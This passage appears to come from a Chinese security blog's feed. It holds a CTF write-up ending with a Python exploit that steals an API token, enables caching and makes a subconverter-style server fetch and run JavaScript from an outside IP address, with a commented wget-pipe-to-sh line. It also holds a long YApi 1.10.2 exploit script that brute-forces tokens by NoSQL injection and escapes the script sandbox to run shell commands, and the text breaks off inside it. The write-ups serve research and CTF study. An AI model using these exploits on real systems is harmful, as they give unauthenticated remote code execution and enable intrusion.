src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710855842772-7893f19c-d328-4a7f-bacf-2a2d0dc927d1.png#averageHue=%2312151b&clientId=ud257d492-5fa8-4&from=paste&height=595&id=u3ec4e6db&originHeight=1190&originWidth=1974&originalType=binary&ratio=2&rotation=0&showTitle=false&size=247960&status=done&style=none&taskId=uf17f788f-57ac-4e5c-a486-96dd8b218b5&title=&width=987" alt="image.png"><br>这个路由需要token验证，高版本把enable-cache关了，这是之前的rce方法。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710856298852-c7bc042a-9f2a-4014-89b7-676a000e73e6.png#averageHue=%2314181d&clientId=ud257d492-5fa8-4&from=paste&height=544&id=ucdbab787&originHeight=1088&originWidth=1934&originalType=binary&ratio=2&rotation=0&showTitle=false&size=305339&status=done&style=none&taskId=ub64028ed-5ac2-4727-abc5-c8ce86be759&title=&width=967" alt="image.png"><br>cache会创建一个缓存文件，然后用script去运行js文件就可以rce。<br>高版本默认关闭了enable-cache，更新配置文件就解决了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">server_addr = <span class="string">&quot;http://127.0.0.1:25500&quot;</span></span><br><span class="line"></span><br><span class="line">rs = requests.Session()</span><br><span class="line"><span class="comment"># get token</span></span><br><span class="line"></span><br><span class="line">resp = rs.get(server_addr + <span class="string">&quot;/getlocal?path=./pref.toml&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    token = re.findall(<span class="string">r&#x27;api_access_token = &quot;(.+)&quot;&#x27;</span>, resp.text)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    token = re.findall(<span class="string">r&#x27;api_access_token = &quot;(.+)&quot;&#x27;</span>,resp.text)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(token)</span><br><span class="line"></span><br><span class="line"><span class="comment"># enable_cache=true</span></span><br><span class="line"><span class="comment"># api_access_token=TOKEN</span></span><br><span class="line">conf_file=<span class="built_in">open</span>(<span class="string">&quot;conf_file.toml&quot;</span>).read().replace(<span class="string">&quot;TOKEN&quot;</span>, token)</span><br><span class="line"></span><br><span class="line"><span class="comment"># update conf</span></span><br><span class="line">resp = rs.post(server_addr + <span class="string">&quot;/updateconf&quot;</span>,params=&#123;<span class="string">&quot;token&quot;</span>:token,<span class="string">&quot;type&quot;</span>:<span class="string">&quot;direct&quot;</span>&#125;,data=conf_file.encode())</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># host a file</span></span><br><span class="line"><span class="comment">#std.popen(&quot;sh -c &#x27;wget -O - xxxxx/s|sh&#x27;&quot;, &quot;r&quot;);</span></span><br><span class="line">node_addr = <span class="string">&#x27;http://8.130.24.188:8886/payload.js&#x27;</span></span><br><span class="line">file_path = <span class="string">&#x27;script:cache/&#x27;</span>+hashlib.md5(node_addr.encode()).hexdigest()</span><br><span class="line"><span class="comment"># fetch my js</span></span><br><span class="line">resp = rs.get(server_addr + <span class="string">&quot;/sub&quot;</span>,params=&#123;<span class="string">&quot;target&quot;</span>:<span class="string">&quot;quanx&quot;</span>,<span class="string">&quot;url&quot;</span>:node_addr&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br><span class="line"><span class="comment"># run my js</span></span><br><span class="line">resp = rs.get(server_addr + <span class="string">&quot;/sub&quot;</span>,params=&#123;<span class="string">&quot;target&quot;</span>:<span class="string">&quot;quanx&quot;</span>,<span class="string">&quot;url&quot;</span>:file_path&#125;)</span><br><span class="line"><span class="built_in">print</span>(resp.text)</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/32634994/1710857568831-a54e44f2-8bfc-4a44-83e0-9e1cadf11de2.png#averageHue=%23272625&clientId=ud257d492-5fa8-4&from=paste&height=346&id=u9e3c2066&originHeight=692&originWidth=1160&originalType=binary&ratio=2&rotation=0&showTitle=false&size=116684&status=done&style=none&taskId=uee066d1d-0667-4e88-974e-230014df516&title=&width=580" alt="image.png"></p>]]></content>
    
    
    <summary type="html">~~~</summary>
    
    
    
    <category term="WriteUp" scheme="http://boogipop.com/categories/WriteUp/"/>
    
    
    <category term="WriteUp" scheme="http://boogipop.com/tags/WriteUp/"/>
    
    <category term="XCTF" scheme="http://boogipop.com/tags/XCTF/"/>
    
  </entry>
  
  <entry>
    <title>春秋云镜 Hospital Writeup</title>
    <link href="http://boogipop.com/2024/03/19/%E6%98%A5%E7%A7%8B%E8%BF%90%E9%95%9C%20Hospital%20Writeup/"/>
    <id>http://boogipop.com/2024/03/19/%E6%98%A5%E7%A7%8B%E8%BF%90%E9%95%9C%20Hospital%20Writeup/</id>
    <published>2024-03-19T07:05:08.898Z</published>
    <updated>2024-03-25T09:42:15.791Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">  <script id="hbeData" type="hbeData" data-hmacdigest="58cd916b3d46a138e3e5838a830e4132f2fe13a90cc7270ae375d6d51fbee498"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">内网渗透</summary>
    
    
    
    <category term="WriteUp" scheme="http://boogipop.com/categories/WriteUp/"/>
    
    
    <category term="private" scheme="http://boogipop.com/tags/private/"/>
    
    <category term="春秋云镜" scheme="http://boogipop.com/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/"/>
    
  </entry>
  
  <entry>
    <title>YApi 1.10.2 Unauthenticed RCE Via NoSQL Injection</title>
    <link href="http://boogipop.com/2024/03/10/YApi%20NoSQL%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>http://boogipop.com/2024/03/10/YApi%20NoSQL%E6%B3%A8%E5%85%A5%E5%AF%BC%E8%87%B4%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</id>
    <published>2024-03-10T04:59:52.000Z</published>
    <updated>2024-03-10T04:59:52.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h1><p>Yapi &lt;&#x3D;1.10.2</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>使用vulhub搭建环境复现，exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> click</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> padding</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urljoin</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger(<span class="string">&#x27;attacker&#x27;</span>)</span><br><span class="line">logger.setLevel(<span class="string">&#x27;WARNING&#x27;</span>)</span><br><span class="line">ch = logging.StreamHandler(sys.stdout)</span><br><span class="line">ch.setFormatter(logging.Formatter(<span class="string">&#x27;%(asctime)s - %(message)s&#x27;</span>))</span><br><span class="line">logger.addHandler(ch)</span><br><span class="line">choices = <span class="string">&#x27;abcedf0123456789&#x27;</span></span><br><span class="line">script_template = <span class="string">r&#x27;&#x27;&#x27;const sandbox = this</span></span><br><span class="line"><span class="string">const ObjectConstructor = this.constructor</span></span><br><span class="line"><span class="string">const FunctionConstructor = ObjectConstructor.constructor</span></span><br><span class="line"><span class="string">const myfun = FunctionConstructor(&#x27;return process&#x27;)</span></span><br><span class="line"><span class="string">const process = myfun()</span></span><br><span class="line"><span class="string">const Buffer = FunctionConstructor(&#x27;return Buffer&#x27;)()</span></span><br><span class="line"><span class="string">const output = process.mainModule.require(&quot;child_process&quot;).execSync(Buffer.from(&#x27;%s&#x27;, &#x27;hex&#x27;).toString()).toString()</span></span><br><span class="line"><span class="string">context.responseData = &#x27;testtest&#x27; + output + &#x27;testtest&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compute</span>(<span class="params">passphase: <span class="built_in">str</span></span>):</span><br><span class="line">    nkey = <span class="number">24</span></span><br><span class="line">    niv = <span class="number">16</span></span><br><span class="line">    key = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    iv = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    p = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        h = hashlib.md5()</span><br><span class="line">        h.update(binascii.unhexlify(p))</span><br><span class="line">        h.update(passphase.encode())</span><br><span class="line">        p = h.hexdigest()</span><br><span class="line"></span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        n = <span class="built_in">min</span>(<span class="built_in">len</span>(p) - i, <span class="number">2</span> * nkey)</span><br><span class="line">        nkey -= n // <span class="number">2</span></span><br><span class="line">        key += p[i:i + n]</span><br><span class="line">        i += n</span><br><span class="line">        n = <span class="built_in">min</span>(<span class="built_in">len</span>(p) - i, <span class="number">2</span> * niv)</span><br><span class="line">        niv -= n // <span class="number">2</span></span><br><span class="line">        iv += p[i:i + n]</span><br><span class="line">        i += n</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> nkey + niv == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> binascii.unhexlify(key), binascii.unhexlify(iv)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_encode</span>(<span class="params">data</span>):</span><br><span class="line">    key, iv = compute(<span class="string">&#x27;abcde&#x27;</span>)</span><br><span class="line">    padder = padding.PKCS7(<span class="number">128</span>).padder()</span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    ct = encryptor.update(padder.update(data.encode()) + padder.finalize()) + encryptor.finalize()</span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(ct).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decode</span>(<span class="params">data</span>):</span><br><span class="line">    key, iv = compute(<span class="string">&#x27;abcde&#x27;</span>)</span><br><span class="line">    unpadder = padding.PKCS7(<span class="number">128</span>).unpadder()</span><br><span class="line">    cipher = Cipher(algorithms.AES(key), modes.CBC(iv))</span><br><span class="line">    decryptor = cipher.decryptor()</span><br><span class="line">    ct = decryptor.update(binascii.unhexlify(data)) + decryptor.finalize()</span><br><span class="line">    ct = unpadder.update(ct) + unpadder.finalize()</span><br><span class="line">    <span class="keyword">return</span> ct.decode().strip()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">brute_token</span>(<span class="params">target, already</span>):</span><br><span class="line">    url = urljoin(target, <span class="string">&#x27;/api/interface/up&#x27;</span>)</span><br><span class="line">    current = <span class="string">&#x27;^&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        <span class="keyword">for</span> ch <span class="keyword">in</span> choices:</span><br><span class="line">            guess = current + ch</span><br><span class="line">            data = &#123;</span><br><span class="line">                <span class="string">&#x27;id&#x27;</span>: -<span class="number">1</span>,</span><br><span class="line">                <span class="string">&#x27;token&#x27;</span>: &#123;</span><br><span class="line">                    <span class="string">&#x27;$regex&#x27;</span>: guess,</span><br><span class="line">                    <span class="string">&#x27;$nin&#x27;</span>: already</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            headers = &#123;</span><br><span class="line">                <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span></span><br><span class="line">            &#125;</span><br><span class="line">            response = requests.post(url,</span><br><span class="line">                                     data=json.dumps(data),</span><br><span class="line">                                     headers=headers,</span><br><span class="line">                                     <span class="comment"># proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span></span><br><span class="line">                                     <span class="comment"># verify=False,</span></span><br><span class="line">                                     )</span><br><span class="line">            res = response.json()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> res[<span class="string">&#x27;errcode&#x27;</span>] == <span class="number">400</span>:</span><br><span class="line">                current = guess</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        logger.debug(<span class="string">f&#x27;current cuess: <span class="subst">&#123;current&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> current[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_owner_uid</span>(<span class="params">target, token</span>):</span><br><span class="line">    url = urljoin(target, <span class="string">&#x27;/api/project/get&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        params = &#123;<span class="string">&#x27;token&#x27;</span>: aes_encode(<span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>|<span class="subst">&#123;token&#125;</span>&#x27;</span>)&#125;</span><br><span class="line">        response = requests.get(url, params=params,</span><br><span class="line">                            <span class="comment"># proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span></span><br><span class="line">                            <span class="comment"># verify=False,</span></span><br><span class="line">                            )</span><br><span class="line">        data = response.json()</span><br><span class="line">        <span class="keyword">if</span> data[<span class="string">&#x27;errcode&#x27;</span>] == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_project</span>(<span class="params">target, token, pid=<span class="literal">None</span></span>):</span><br><span class="line">    url = urljoin(target, <span class="string">&#x27;/api/project/get&#x27;</span>)</span><br><span class="line">    params = &#123;<span class="string">&#x27;token&#x27;</span>: token&#125;</span><br><span class="line">    <span class="keyword">if</span> pid:</span><br><span class="line">        params[<span class="string">&#x27;id&#x27;</span>] = pid</span><br><span class="line"></span><br><span class="line">    response = requests.get(url,</span><br><span class="line">                            params=params,</span><br><span class="line">                            <span class="comment">#proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span></span><br><span class="line">                            <span class="comment">#verify=False,</span></span><br><span class="line">                            )</span><br><span class="line">    data = response.json()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> data[<span class="string">&#x27;errcode&#x27;</span>] == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> data[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_col</span>(<span class="params">target, token, brute_from, brute_to</span>):</span><br><span class="line">    url = urljoin(target, <span class="string">&#x27;/api/open/run_auto_test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(brute_from, brute_to):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            params = &#123;<span class="string">&#x27;token&#x27;</span>: token, <span class="string">&#x27;id&#x27;</span>: i, <span class="string">&quot;mode&quot;</span>: <span class="string">&quot;json&quot;</span>&#125;</span><br><span class="line">            response = requests.get(url,</span><br><span class="line">                                    params=params,</span><br><span class="line">                                    timeout=<span class="number">5</span>,</span><br><span class="line">                                    <span class="comment">#proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span></span><br><span class="line">                                    <span class="comment">#verify=False,</span></span><br><span class="line">                                    )</span><br><span class="line"></span><br><span class="line">            data = response.json()</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;message&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> data[<span class="string">&#x27;message&#x27;</span>][<span class="string">&#x27;len&#x27;</span>] &gt; <span class="number">0</span>:</span><br><span class="line">                logger.debug(<span class="string">&#x27;Test Result Found: %r&#x27;</span>, response.url)</span><br><span class="line">                <span class="keyword">yield</span> i</span><br><span class="line">        <span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">            logger.debug(<span class="string">&#x27;id=%d timeout&#x27;</span>, i)</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_project</span>(<span class="params">target, token, project_id, command</span>):</span><br><span class="line">    url = urljoin(target, <span class="string">&#x27;/api/project/up&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    command_hex = command.encode().<span class="built_in">hex</span>()</span><br><span class="line">    script = script_template % command_hex</span><br><span class="line">    response = requests.post(url,</span><br><span class="line">                             params=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;,</span><br><span class="line">                             json=&#123;<span class="string">&#x27;id&#x27;</span>: project_id, <span class="string">&#x27;after_script&#x27;</span>: script&#125;,</span><br><span class="line">                             <span class="comment"># proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span></span><br><span class="line">                             <span class="comment"># verify=False,</span></span><br><span class="line">                             )</span><br><span class="line">    data = response.json()</span><br><span class="line">    <span class="keyword">return</span> data[<span class="string">&#x27;errcode&#x27;</span>] == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_auto_test</span>(<span class="params">target, token, col_id</span>):</span><br><span class="line">    url = urljoin(target, <span class="string">&#x27;/api/open/run_auto_test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    response = requests.get(url, </span><br><span class="line">                            params=&#123;<span class="string">&#x27;token&#x27;</span>: token, <span class="string">&#x27;id&#x27;</span>: col_id, <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;json&#x27;</span>&#125;,</span><br><span class="line">                            <span class="comment"># proxies=&#123;&#x27;https&#x27;: &#x27;http://127.0.0.1:8085&#x27;, &#x27;http&#x27;: &#x27;http://127.0.0.1:8085&#x27;&#125;,</span></span><br><span class="line">                            <span class="comment"># verify=False,</span></span><br><span class="line">                            )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = response.json()</span><br><span class="line">        <span class="keyword">return</span> data[<span class="string">&#x27;list&#x27;</span>][<span class="number">0</span>][<span class="string">&#x27;res_body&#x27;</span>][<span class="number">8</span>:-<span class="number">8</span>]</span><br><span class="line">    <span class="keyword">except</span> (requests.exceptions.JSONDecodeError, KeyError, IndexError, TypeError) <span class="keyword">as</span> e:</span><br><span class="line">        g = re.search(<span class="string">br&#x27;testtest(.*?)testtest&#x27;</span>, response.content, re.I | re.S)</span><br><span class="line">        <span class="keyword">if</span> g:</span><br><span class="line">            <span class="keyword">return</span> g.group(<span class="number">1</span>).decode()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">clear_project</span>(<span class="params">target, token, project_id, old_after_script</span>):</span><br><span class="line">    url = urljoin(target, <span class="string">&#x27;/api/project/up&#x27;</span>)</span><br><span class="line">    response = requests.post(url, params=&#123;<span class="string">&#x27;token&#x27;</span>: token&#125;, json=&#123;<span class="string">&#x27;id&#x27;</span>: project_id, <span 